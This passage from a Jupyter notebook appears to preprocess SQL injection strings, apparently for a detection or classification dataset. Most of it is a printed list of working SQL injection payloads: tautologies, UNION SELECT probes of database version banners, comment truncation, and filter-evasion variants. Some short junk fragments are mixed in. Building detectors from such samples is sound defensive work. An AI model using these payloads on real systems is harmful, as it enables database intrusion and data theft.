    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 8 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 200 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"23 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('\"1', '\"numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace('1\"', '\"numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\"7659\", 'numeric')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 37 \", ' numeric ')\n",
    "        all_sqli_sentence[i]=all_sqli_sentence[i].replace(\" 45 \", ' numeric ')\n",
    "    \n",
    "    return all_sqli_sentence\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 83,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[' select * from users where id = 1 or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( \\\\+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or  ( $+ )  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  ( $+ )  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\.<  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 ||1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1   or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\+<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or  1<@ = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \\\\+<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\+<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or 1&@# = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or $ . = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $ 1 = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $ 1 = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\. union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $+<\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or $+<1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $+<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or $+<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\. union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<$ union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or \\\\<  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \\\\<  = 1 union select 1,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 or !<@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or !<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or @`\\\\` union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or  @$# = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or @<@ = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + ( \\\\ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( \\\\ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1.&&1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.&&@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\. )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\. )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1.  union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1.  union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1. union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +\\\\. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1. union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1. <@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.<@. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.<@. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1.*1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.*1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1.<1# union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. <@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1. <@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1.*\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1.<@$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.<@$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1.%@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1.%@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 11||1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 +1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( 1 )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 + ( 1 )  union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 +1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 +1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 11<1# union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\+ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( \\\\+ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +\\\\+. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 -1<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +1<@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +1<@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + \\\\+*\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + \\\\+%$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + \\\\+*$ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select 1||1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1||@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 1$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 $,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 1a,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1<@$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select .1_,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1`\\\\`,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1a#,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select 1a,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select .1$_,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1<@.,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select 1 $$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select !<1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select +!<1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select +!<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select !<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @||1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @&&@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ 1$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select  @ $,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ 1a,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @<@$,version (  )  -- 1',\n",
       " ' select * from users where id = 1   union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 union select @ _,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ $_,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @<@,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @<@.,version (  )  -- 1',\n",
       " ' select * from users where id = 1 union select @ $$,version (  )  -- 1',\n",
       " ' select * from users where id = 1 +$ . or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +$ . union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$ 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +$ 1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$+ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( $+ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +  ( $+ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$+. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 +$+. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 +$+ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + $+%\\\\ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + $+%1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + $+%1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + $+*\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 + $+%$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 + $+*$ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 % ( \\\\ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 * ( \\\\ )  union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 % ( 1 )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 * ( 1 )  union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 % ( $ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 % ( @ )  or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@.. or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1<@.. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@. union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1  <@. union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 *\\\\. union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@.$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@.$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 *1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 *1 union select null,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1 <1## union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@1$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@1$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 *\\\\ union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@$ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 %$ . or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 *$ . union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 %$ 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 %$ 1 union select null,@@VERSION -- 1',\n",
       " ' select * from users where id = 1 <@$_ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@$_ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@<@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 %!<1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 | |1 union select 1,banner from v$version where rownum = 1 -- 1',\n",
       " ' select * from users where id = 1<@<@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@<@ union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@<@ union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 %!<@ or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 <@&@ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 <@$$ union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 &@ or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' or ||/1 = 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or  ( \\\\ )  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or  ( \\\\. )  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or  ( 1 )  = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<\\\\ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<$ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\.<  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' ||1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1'   or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or 1^ = 1 union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or $ . = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $ 1 = 1 or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or $ 1 = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $<\\\\ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or $<\\\\. union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or $+<$ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<\\\\. or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<\\\\. union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<1 or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or !<1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<\\\\ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<$ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<$ union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or \\\\<  = 1 union select 1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' or !<@ or 1 = 1 -- 1'\",\n",
       " \" select * from users where id = '1' or !<@ union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or @ ( 1 )  = 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or @ 1 = 1 union select 1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' or @ @1 = 1 union select 1,version (  )  -- 1'\",\n",
       " ' select * from users where id = 1 or \" (  ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( ,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( .\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( 1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \" ( ;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( ]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\" (  union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \" ( #\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( [\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( _\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\" (  = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\" (  = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \" ( &\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( @\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ( {\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" )  ( \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) ,\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) .\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) 1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \" ) ;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) ]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) [\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) $\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) @\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \" ) {\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \", ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \", ) \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",.\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \",;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",?\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\", union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \",#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\", = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\", = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \",&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \",{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \". ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \". ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".,\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"..\" = 1 or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \".;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\". union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \".#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"._\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\". = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\". = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \".%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \".{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1 ( \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1 ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1,\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"1;\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"1 union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"1#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"1{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' or \"\"<@ union select 1,version (  )  -- 1\\'',\n",
       " '&1c',\n",
       " ' ( s',\n",
       " ' ) s',\n",
       " ',s',\n",
       " '.s',\n",
       " '1s',\n",
       " ';s',\n",
       " '?s',\n",
       " 'UE1',\n",
       " 'UEf',\n",
       " 'UEs',\n",
       " 'UEv',\n",
       " 'c',\n",
       " 'n',\n",
       " 'ns',\n",
       " 'os',\n",
       " 's',\n",
       " 'v',\n",
       " '{s',\n",
       " ' select * from users where id = 1 or 1#\"; or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"; ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"; ) \" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";,\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";.\" = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \";]\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \";#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or @#\"; = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"; = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \";&\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select \";\"_,version (  )  -- 1\\'',\n",
       " ' select * from users where id = 1 or \";@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \";{\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"? ( \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"] ) \" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"?,\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select $[\"],@@VERSION -- 1\\'',\n",
       " ' select * from users where id = 1 or \"].\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"]1\" or 1 = 1 -- 1',\n",
       " 's',\n",
       " ' select * from users where id = 1 or \"?;\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"??\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select version (  ) ,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select \\'a\\',version (  )  -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? union select null,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"?#\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"?[\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"?_\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? = 1 or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or 1#\"? = 1 union select 1,version (  )  -- 1',\n",
       " ' select * from users where id = 1 or \"?%\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = \\'1\\' union select \"?\"_,version (  )  -- 1\\'',\n",
       " ' select * from users where id = 1 or \"?@\" or 1 = 1 -- 1',\n",
       " ' select * from users where id = 1 or \"]{\" or 1 = 1 -- 1',\n",
       " \" select * from users where id = '1' union select ||/1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' union select  ( \\\\ ) ,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select  ( \\\\. ) ,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select  ( 1 ) ,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\.,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\.#,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select \\\\.%1,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select 1,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' union select 1a,banner from v$version where rownum = 1 -- 1'\",\n",
       " ' select * from users where id = \\'1\\' union select 1\"!\",banner from v$version where rownum = 1 -- 1\\'',\n",
       " \" select * from users where id = '1' union select \\\\#,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select $ .,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select $ _,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select $*$,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select +\\\\,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select +\\\\.,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select !<1,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' union select +\\\\#,@@VERSION -- 1'\",\n",
       " \" select * from users where id = '1' union select !<@,version (  )  -- 1'\",\n",
       " \" select * from users where id = '1' union select @ 1,version (  )  --  1'\",\n",
       " \" select * from users where id = '1'   union select null,banner from v$version where rownum = 1 -- 1'\",\n",
       " \" select * from users where id = '1' union select @ @1,version (  )  --  1'\",\n",
       " ' select * from users where id = 1 or \"\\\\#\" or 1 = 1 -- 1',\n",
